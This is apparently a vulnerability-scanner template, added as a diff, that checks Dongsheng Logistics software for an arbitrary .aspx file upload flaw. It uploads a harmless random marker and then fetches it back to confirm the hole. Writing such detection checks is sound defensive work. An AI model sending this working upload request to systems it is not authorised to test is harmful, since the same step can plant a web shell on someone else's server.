@@ -1,0 +1,59 @@
+id: dongshengsoft-fileinputhandler-anyfile-upload
+info:
+  name: FileInputHandler Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an arbitrary file upload vulnerability in the FileInputHandler of Dongsheng Logistics software.
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(8)}}"
+  t2: "{{base64(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/SoftMng/FileInputHandler/Upload"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="LoadFile"; filename="{{t1}}.aspx"
+      Content-Type: application/octet-stream
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - ".aspx"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "([0-9_]{16,32}).aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/UploadFiles/Filepuload/{{dt1}}{{dt2}}/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
